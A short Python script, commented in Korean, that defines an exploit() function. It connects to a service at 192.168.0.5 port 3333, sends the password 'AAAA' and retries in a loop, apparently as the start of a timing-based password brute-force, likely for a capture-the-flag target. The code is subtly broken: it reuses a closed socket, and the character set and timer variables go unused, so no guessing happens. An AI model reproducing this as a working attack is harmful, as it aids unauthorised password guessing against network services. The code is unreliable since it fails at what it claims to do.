import socket
import time
import string

def exploit():
    TCP_IP = '192.168.0.5'  # 서버 IP (실제 IP로 변경)
    TCP_PORT = 3333
    password = 'AAAA'
    strings = string.printable
    test_count = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("[+] Connecting to %s:%d" % (TCP_IP, TCP_PORT))

    while test_count <= 10:
        try:
            max_time = 0
            s.connect((TCP_IP, TCP_PORT))
            print(s.recv(1024))
            s.send(password.encode())

            print(s.recv(1024))

            # 소켓 통신 후에 연결을 강제로 끊었는지 확인
            response = s.recv(1024)
            if not response:
                print("[-] Connection closed by the server. Reconnecting...")
                continue  # 다시 연결 시도

            test_count += 1

        except socket.error as e:
            print("[-] Socket error occurred:", str(e))
            print("[-] Reconnecting...")
            time.sleep(3)
            continue  # 다시 연결 시도

        finally:
            s.close()  # 소켓을 닫고 다시 생성하기 위해 연결 해제

        time.sleep(1)  # 1초 대기 후 재시도

exploit()

